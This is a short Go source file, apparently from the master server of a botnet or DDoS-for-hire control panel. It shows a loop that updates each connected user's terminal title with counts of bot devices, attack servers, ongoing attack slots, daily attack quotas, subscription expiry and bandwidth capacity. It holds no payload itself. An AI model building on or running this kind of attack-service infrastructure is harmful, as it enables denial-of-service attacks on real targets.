package main

import (
	"fmt"
	"time"
)

// Runs in the background once the master server has started
func Title() {
	for {
		slots, err := OngoingAttacks(time.Now())
		if err != nil {
			slots = make([]AttackLog, 0)
		}

		workersMux.RLock()
		l7Count := len(workers)
		workersMux.RUnlock()

		var capacityDisplay string
		speedtestMutex.RLock()
		if speedtestCount > 0 {
			capacityDisplay = fmt.Sprintf(" | Capacity: %.2f Mbps", speedtestTotalMbps)
		} else {
			capacityDisplay = " | Capacity: 0.00 Mbps"
		}
		speedtestMutex.RUnlock()

		for id, session := range Sessions {
			sent, err := UserOngoingAttacks(session.User.Username, time.Date(time.Now().Year(), time.Now().Month(), time.Now().Day(), 0, 0, 0, 0, time.Now().Location()))
			if err != nil {
				// handle error
			}

			expiryTime := time.Unix(session.User.Expiry, 0)
			daysLeft := int(time.Until(expiryTime).Hours() / 24)
			if daysLeft < 0 {
				daysLeft = 0
			}

			// Construir título
			title := fmt.Sprintf("\033]0;Devices: %d | Servers: %d | Slots: %d/%d | Sessions: %d",
				len(Clients), l7Count, len(slots), Options.Templates.Attacks.MaximumOngoing, len(Sessions))

			if !Attacks {
				title += fmt.Sprintf(" | Attacks: Disabled | Expiry: %d days", daysLeft)
			} else {
				title += fmt.Sprintf(" | Attacks: %d/%d | Expiry: %d days", len(sent), session.User.MaxDaily, daysLeft)
			}
			// Añadir capacidad
			title += capacityDisplay
			title += " \007"

			if _, err := session.Conn.Write([]byte(title)); err != nil {
				delete(Sessions, id)
				return
			}
		}

		time.Sleep(1 * time.Second)
	}
}
